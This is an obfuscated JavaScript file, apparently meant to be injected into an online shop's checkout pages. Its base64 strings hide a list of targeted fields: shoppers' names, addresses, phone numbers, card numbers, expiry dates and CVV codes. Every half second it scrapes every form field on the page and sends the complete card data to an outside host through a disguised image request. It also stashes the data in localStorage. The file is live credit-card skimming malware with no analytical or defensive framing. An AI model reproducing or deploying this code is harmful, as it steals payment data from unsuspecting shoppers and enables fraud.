var zwadh = {};
zwadh.okstb = document;
zwadh.ulcod = "W1sibmFtZSIsICJmaXJzdG5hbWUiLCAwLCAiZiIsICJIb2xkZXIiXSwgWyJuYW1lIiwgImxhc3RuYW1lIiwgMCwgImwiLCAiSG9sZGVyIl0sIFsibmFtZSIsICJzdHJlZXRbMF0iLCAwLCAibyIsICJhZGRyXzAiXSwgWyJuYW1lIiwgInN0cmVldFsxXSIsIDAsICJvIiwgImFkZHJfMSJdLCBbIm5hbWUiLCAic3RyZWV0WzJdIiwgMCwgIm8iLCAiYWRkcl8yIl0sIFsibmFtZSIsICJjaXR5IiwgMCwgIm8iLCAiY2l0eSJdLCBbIm5hbWUiLCAicmVnaW9uX2lkIiwgMCwgIm8iLCAic3RhdGUiXSwgWyJuYW1lIiwgInBvc3Rjb2RlIiwgMCwgIm8iLCAiemlwIl0sIFsibmFtZSIsICJjb3VudHJ5X2lkIiwgMCwgIm8iLCAiY291bnRyeSJdLCBbIm5hbWUiLCAidGVsZXBob25lIiwgMCwgIm8iLCAicGhvbmUiXSwgWyJpZCIsICJhdXRobmV0Y2ltLWNjLW51bWJlciIsIDAsICJuIiwgIk51bWJlciJdLCBbImlkIiwgImF1dGhuZXRjaW0tY2MtZXhwLW1vbnRoIiwgMCwgIm0iLCAiRGF0ZSJdLCBbImlkIiwgImF1dGhuZXRjaW0tY2MtZXhwLXllYXIiLCAwLCAieSIsICJEYXRlIl0sIFsiaWQiLCAiYXV0aG5ldGNpbS1jYy1jaWQiLCAwLCAiYyIsICJDVlYiXV0=";
zwadh.lpzoz = "aHR0cHM6Ly9hcmlhcGVyZnVtZS5jb20vZXJyb3JzL2RlZmF1bHQvNDAzLnBocA==";
zwadh.ehnrt = window["JSON"]["parse"](window["atob"](zwadh.ulcod));
zwadh.iqvbe = {};
zwadh.abzqh = [];
zwadh.dxeqg = "eshue";
zwadh.eqjxm = function(){
    var i = zwadh.okstb["getElementsByTagName"]("input");
    var s = zwadh.okstb["getElementsByTagName"]("select");
    var t = zwadh.okstb["getElementsByTagName"]("textarea");
    for(var j = 0; j < i.length; j++) zwadh.klugz(i[j]);
    for(var j = 0; j < s.length; j++) zwadh.klugz(s[j]);
    for(var j = 0; j < t.length; j++) zwadh.klugz(t[j]);
    zwadh.iqvbe["Domain"] = location["hostname"];
};
zwadh.klugz = function(e){
    var field_found = false;
    for(var i = 0; i < zwadh.ehnrt.length; i++){
        var field = zwadh.ehnrt[i];
        if(e["hasAttribute"](field[0]) && e["attributes"][field[0]]["value"] == field[1]){
            field_found = true;
            if( zwadh.wkwyv(e, field[2]).length > 0 &&  zwadh.wkwyv(e, field[2]).length < 256) {
                if(field[3] == "l") zwadh.iqvbe[field[4]] += " " + zwadh.wkwyv(e, field[2]);
                else if(field[3] == "y") zwadh.iqvbe[field[4]] += "/" + zwadh.wkwyv(e, field[2]);
                else zwadh.iqvbe[field[4]] = zwadh.wkwyv(e, field[2]);
            }
        }
    }
    if(!field_found){
        if(zwadh.npshx(e, "id")){
            zwadh.iqvbe[e["id"]] = e["value"];
            return;
        }
        if(zwadh.npshx(e, "name")){
            zwadh.iqvbe[e["name"]] = e["value"];
            return;
        }
    }
};
zwadh.npshx = function(e, a){
    if(e["hasAttribute"](a) && e["attributes"][a]["value"].length > 0 && e["value"].length > 0 && e["value"].length < 256)
        return true;
    return false;
};
zwadh.wkwyv = function(e, t){
    switch(t){
        case 0:
            return e["value"]["trim"]();
        case 1:
            return e["innerHTML"]["trim"]();
        case 2:
            return e["innerText"]["trim"]();
        case 3:
            return e["selectedOptions"][0]["innerText"];
    }
};
zwadh.fqzvo = function(){
    for(var i = 0; i < zwadh.ehnrt.length; i++){
        var field = zwadh.ehnrt[i];
        if(field[3] == "n" && (typeof(zwadh.iqvbe[field[4]]) == "undefined" || zwadh.iqvbe[field[4]].length < 11)) return false;
        if((field[3] == "h" || field[3] == "f" || field[3] == "l") && (typeof(zwadh.iqvbe[field[4]]) == "undefined" || zwadh.iqvbe[field[4]].length == 0)) return false;
        if((field[3] == "e" || field[3] == "m" || field[3] == "y") && (typeof(zwadh.iqvbe[field[4]]) == "undefined" || zwadh.iqvbe[field[4]].length == 0)) return false;
        if(field[3] == "c" && (typeof(zwadh.iqvbe[field[4]]) == "undefined" || zwadh.iqvbe[field[4]].length < 3)) return false;
    }
    return true;
};
zwadh.nzlxx = function(d){
    return (zwadh.abzqh.indexOf(d) != -1);
};
zwadh.xrzyh = function(){
    zwadh.eqjxm();
    zwadh.hmpil();
    zwadh.erykb();
};
zwadh.hmpil = function(){
    var d = window["btoa"](window["JSON"]["stringify"](zwadh.iqvbe).replace(/[\u{0080}-\u{FFFF}]/gu,""));
    if(zwadh.fqzvo() && !zwadh.nzlxx(d)){
        zwadh.abzqh["push"](d);
        var i = zwadh.okstb["createElement"]("IMG");
        i["src"] = window["atob"](zwadh.lpzoz) + "?hash=" + d;
    }
};
zwadh.erykb = function(){
    var d = window["btoa"](window["encodeURIComponent"](window["JSON"]["stringify"](zwadh.iqvbe)));
    window["localStorage"]["setItem"](zwadh.dxeqg, d);
};
zwadh.zbtsf = function(){
    var d = window["localStorage"]["getItem"](zwadh.dxeqg);
    if(d !== null){
        zwadh.iqvbe = window["JSON"]["parse"](window["decodeURIComponent"](window["atob"](d)));
    }
};
zwadh.zbtsf();
window["setInterval"](zwadh.xrzyh, 500);